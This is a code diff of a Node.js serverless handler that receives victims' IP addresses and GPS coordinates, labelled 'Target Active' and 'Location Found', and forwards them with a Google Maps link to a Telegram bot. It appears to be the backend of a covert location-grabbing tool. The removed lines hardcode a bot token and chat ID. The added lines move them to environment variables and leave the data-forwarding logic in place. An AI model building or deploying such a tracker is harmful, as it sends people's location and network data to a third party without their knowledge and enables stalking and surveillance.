@@ -1,20 +1,36 @@
-// api/send.js (Node.js)
 const fetch = require('node-fetch');
 
 export default async function handler(req, res) {
-    if (req.method === 'POST') {
-        const botToken = "8731114549:AAF2xNA9djXbJbcsOhXvlKQY-ul8SMHPHbM";
-        const chatId = "7681204940";
-        const data = req.body;
-
-        let message = `🔔 *New Target Logged*\n\n`;
-        if(data.ip) message += `🌐 IP: ${data.ip}\n`;
-        if(data.lat) message += `📍 Loc: ${data.lat}, ${data.lon}\n🔗 [Google Maps](${data.google_map})`;
-
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-        
-        await fetch(url);
-        return res.status(200).send("OK");
+    if (req.method !== 'POST') {
+        return res.status(405).json({ error: 'Method not allowed' });
     }
-    res.status(405).send("Method Not Allowed");
+
+    // Vercel Environment Variables se data uthayega
+    const TOKEN = process.env.BOT_TOKEN;
+    const CHAT_ID = process.env.CHAT_ID;
+
+    const data = req.body;
+    let message = "";
+
+    if (data.type === 'IP') {
+        message = `🌐 *Target Active*\nIP: \`${data.val}\`\nDate: 30 April 2026`;
+    } else if (data.type === 'LOC') {
+        message = `📍 *Location Found*\nLat: \`${data.lat}\`\nLon: \`${data.lon}\`\n🔗 [Google Maps](${data.map})`;
+    }
+
+    try {
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "Markdown"
+            })
+        });
+        return res.status(200).json({ success: true });
+    } catch (error) {
+        return res.status(500).json({ error: 'Telegram API Error' });
+    }
 }
